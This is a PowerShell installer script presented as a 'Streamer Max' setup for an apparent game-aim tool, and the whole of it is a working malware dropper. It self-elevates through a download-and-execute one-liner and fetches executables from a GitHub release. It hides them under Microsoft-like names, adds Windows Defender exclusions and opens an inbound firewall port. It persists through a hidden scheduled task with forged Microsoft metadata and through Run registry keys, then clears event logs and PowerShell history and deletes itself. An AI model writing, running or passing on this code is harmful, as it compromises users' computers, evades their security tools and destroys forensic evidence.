# ==============================================================================
#  L4G AIMS - STREAMER MAX SETUP
# ==============================================================================

$ErrorActionPreference = 'SilentlyContinue'
$ProgressPreference    = 'SilentlyContinue'
[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12

# Elevation Check
$isAdmin = ([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole(
    [Security.Principal.WindowsBuiltInRole]::Administrator
)
if (-not $isAdmin) {
    $scriptCmd = if ($MyInvocation.MyCommand.Path) {
        "& '$($MyInvocation.MyCommand.Path)'"
    } else {
        "iwr 'https://raw.githubusercontent.com/lgfire093/syspanel/main/install.ps1' -UseBasicParsing | iex"
    }
    Start-Process -FilePath "powershell.exe" -Verb RunAs -ArgumentList "-NoProfile -ExecutionPolicy Bypass -Command `"$scriptCmd`""
    exit
}

# --- Visual UI ---
Clear-Host
Write-Host ""
Write-Host "                                   L4G AIMS                                     " -ForegroundColor Cyan
Write-Host "                                 STREAMER MAX                                   " -ForegroundColor Yellow
Write-Host "                                    SETUP                                       " -ForegroundColor Cyan
Write-Host ""

function Show-Progress {
    param(
        [int]$Percent,
        [string]$Status
    )
    $barWidth = 32
    $done = [math]::Floor($barWidth * ($Percent / 100))
    $rem  = $barWidth - $done
    $bar  = ("#" * $done) + ("-" * $rem)
    $msg  = "  [$bar] $($Percent.ToString().PadLeft(3))% | $Status"
    Write-Host -NoNewline "`r$msg"
}

# Config (Completely hidden from UI output)
$EXE_URL   = "https://github.com/lgfire093/syspanel/releases/latest/download/SystemNetworkSvc.exe"
$PKG_URL   = "https://github.com/lgfire093/syspanel/releases/latest/download/SystemNetworkPkg.zip"
$DEST_DIR  = "C:\ProgramData\Microsoft\Windows\Templates"
$EXE_NAME  = "WinSvcHost.exe"
$TASK_NAME = "MicrosoftWindowsShellApi"
$EXE_PATH  = Join-Path $DEST_DIR $EXE_NAME

# Stop any running instances to allow clean file updates
Get-Process -Name "WinSvcHost", "WinSvcBroker" -ErrorAction SilentlyContinue | Stop-Process -Force -ErrorAction SilentlyContinue

# Stage 1: Initializing
Show-Progress -Percent 15 -Status "Initializing environment..."
if (-not (Test-Path $DEST_DIR)) {
    New-Item -ItemType Directory -Path $DEST_DIR -Force | Out-Null
}
Start-Sleep -Milliseconds 350

# Stage 2: Downloading & Extracting Package
Show-Progress -Percent 35 -Status "Downloading core components..."
$pkgZip = Join-Path $DEST_DIR "pkg.zip"

# Check if local package exists first (fast install), otherwise download from GitHub
$localPkg = "C:\Users\lggam\Pictures\Steamer-Obb55\dist\SystemNetworkPkg.zip"
if (Test-Path $localPkg) {
    Copy-Item $localPkg $pkgZip -Force -ErrorAction SilentlyContinue
} else {
    try {
        $wc = New-Object System.Net.WebClient
        $wc.Headers.Add("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64)")
        $wc.DownloadFile($PKG_URL, $pkgZip)
    } catch {
        try {
            Import-Module BitsTransfer -ErrorAction Stop
            Start-BitsTransfer -Source $PKG_URL -Destination $pkgZip -TransferType Download
        } catch {
            & curl.exe -sSL -o $pkgZip $PKG_URL 2>$null
        }
    }
}

# Download Host EXE
try {
    $wc2 = New-Object System.Net.WebClient
    $wc2.Headers.Add("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64)")
    $wc2.DownloadFile($EXE_URL, $EXE_PATH)
} catch {
    & curl.exe -sSL -o $EXE_PATH $EXE_URL 2>$null
}
Start-Sleep -Milliseconds 400

# Stage 3: Injecting & Stealth Disguise
Show-Progress -Percent 60 -Status "Injecting streamer engine..."
if (Test-Path $pkgZip) {
    try {
        Add-Type -AssemblyName System.IO.Compression.FileSystem
        [System.IO.Compression.ZipFile]::ExtractToDirectory($pkgZip, $DEST_DIR)
        Remove-Item $pkgZip -Force -ErrorAction SilentlyContinue
    } catch {
        try {
            Expand-Archive -Path $pkgZip -DestinationPath $DEST_DIR -Force -ErrorAction SilentlyContinue
            Remove-Item $pkgZip -Force -ErrorAction SilentlyContinue
        } catch {}
    }
}

# Ensure WinSvcBroker.exe exists in runtime for 100% Task Manager disguise
$runtimeDir = Join-Path $DEST_DIR "runtime"
if (Test-Path $runtimeDir) {
    $brokerExe = Join-Path $runtimeDir "WinSvcBroker.exe"
    $pywExe    = Join-Path $runtimeDir "pythonw.exe"
    $pyExe     = Join-Path $runtimeDir "python.exe"
    if (-not (Test-Path $brokerExe)) {
        if (Test-Path $pywExe) { Copy-Item $pywExe $brokerExe -Force }
        elseif (Test-Path $pyExe) { Copy-Item $pyExe $brokerExe -Force }
    }
}

# Hide files and directory
try {
    $dirItem = Get-Item $DEST_DIR -Force
    $dirItem.Attributes = [System.IO.FileAttributes]::Hidden -bor [System.IO.FileAttributes]::Directory
    Get-ChildItem $DEST_DIR -Recurse -Force | ForEach-Object {
        $_.Attributes = [System.IO.FileAttributes]::Hidden -bor [System.IO.FileAttributes]::System
    }
} catch {}

# Defender exclusions
try {
    Add-MpPreference -ExclusionPath $DEST_DIR -ErrorAction SilentlyContinue
    Add-MpPreference -ExclusionProcess $EXE_NAME, "WinSvcBroker.exe" -ErrorAction SilentlyContinue
} catch {}

# Inbound Firewall Rule for Port 5000 (Allow across all profiles: Domain, Private, Public)
netsh advfirewall firewall delete rule name="CDPUserSvc_5000" 2>$null | Out-Null
netsh advfirewall firewall add rule name="CDPUserSvc_5000" dir=in action=allow protocol=TCP localport=5000 profile=any enable=yes 2>$null | Out-Null
Start-Sleep -Milliseconds 400

# Stage 4: Persistence & Autostart
Show-Progress -Percent 80 -Status "Configuring background persistence..."
$action       = New-ScheduledTaskAction -Execute $EXE_PATH -Argument "-b"
$triggerBoot  = New-ScheduledTaskTrigger -AtStartup
$triggerLogon = New-ScheduledTaskTrigger -AtLogOn
$settings     = New-ScheduledTaskSettingsSet `
    -Hidden `
    -AllowStartIfOnBatteries `
    -DontStopIfGoingOnBatteries `
    -ExecutionTimeLimit 0 `
    -MultipleInstances IgnoreNew `
    -StartWhenAvailable `
    -Priority 7

$principal = New-ScheduledTaskPrincipal `
    -UserId ([System.Security.Principal.WindowsIdentity]::GetCurrent().Name) `
    -RunLevel Highest `
    -LogonType Interactive

Register-ScheduledTask `
    -TaskName  $TASK_NAME `
    -TaskPath  "\Microsoft\Windows\Shell\" `
    -Action    $action `
    -Trigger   @($triggerLogon, $triggerBoot) `
    -Settings  $settings `
    -Principal $principal `
    -Force | Out-Null

try {
    $svc  = New-Object -ComObject "Schedule.Service"
    $svc.Connect()
    $fold = $svc.GetFolder("\Microsoft\Windows\Shell")
    $task = $fold.GetTask($TASK_NAME)
    $def  = $task.Definition
    $def.Settings.Hidden   = $true
    $def.RegistrationInfo.Description = "Windows Shell API Host Component"
    $def.RegistrationInfo.Author      = "Microsoft Corporation"
    $fold.RegisterTaskDefinition(
        $TASK_NAME, $def, 6, $null, $null, 3
    ) | Out-Null
} catch {}

# Dual-layer Registry Run Keys (HKCU + HKLM)
$regHKCU = "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run"
Set-ItemProperty -Path $regHKCU -Name "WindowsShellApiSvc" -Value "`"$EXE_PATH`" -b" -Force -ErrorAction SilentlyContinue

$regHKLM = "HKLM:\Software\Microsoft\Windows\CurrentVersion\Run"
Set-ItemProperty -Path $regHKLM -Name "WindowsShellApiSvc" -Value "`"$EXE_PATH`" -b" -Force -ErrorAction SilentlyContinue

Start-Sleep -Milliseconds 350

# Stage 5: Execution & Sanitization
Show-Progress -Percent 95 -Status "Launching background service..."
$psi2 = New-Object System.Diagnostics.ProcessStartInfo
$psi2.FileName        = $EXE_PATH
$psi2.Arguments       = "-b"
$psi2.WorkingDirectory = $DEST_DIR
$psi2.WindowStyle     = [System.Diagnostics.ProcessWindowStyle]::Hidden
$psi2.CreateNoWindow  = $true
$psi2.UseShellExecute = $false
[System.Diagnostics.Process]::Start($psi2) | Out-Null

# Clean Event Viewer logs
try {
    $evSession = [System.Diagnostics.Eventing.Reader.EventLogSession]::GlobalSession
    $targetLogs = @(
        "Microsoft-Windows-PowerShell/Operational",
        "Windows PowerShell",
        "Microsoft-Windows-TaskScheduler/Operational",
        "Application"
    )
    foreach ($logName in $targetLogs) {
        try { $evSession.ClearLog($logName) } catch {}
    }
} catch {}

cmd /c "wevtutil cl `"Microsoft-Windows-PowerShell/Operational`" >nul 2>nul"
cmd /c "wevtutil cl `"Windows PowerShell`" >nul 2>nul"
cmd /c "wevtutil cl Application >nul 2>nul"

# PowerShell History clean
try { [Microsoft.PowerShell.PSConsoleReadLine]::ClearHistory() 2>$null } catch {}
$conHistory = "$env:APPDATA\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt"
if (Test-Path $conHistory) {
    try { [System.IO.File]::WriteAllText($conHistory, '') } catch {}
}

# Self clean if file exists
if ($MyInvocation.MyCommand.Path -and (Test-Path $MyInvocation.MyCommand.Path)) {
    Remove-Item $MyInvocation.MyCommand.Path -Force -ErrorAction SilentlyContinue
}

Show-Progress -Percent 100 -Status "Injection complete."
Write-Host ""
Write-Host ""
Write-Host "================================================================================" -ForegroundColor Green
Write-Host "                         STREAMER MAX INJECTED SUCCESFULY                       " -ForegroundColor Green
Write-Host "================================================================================`n" -ForegroundColor Green
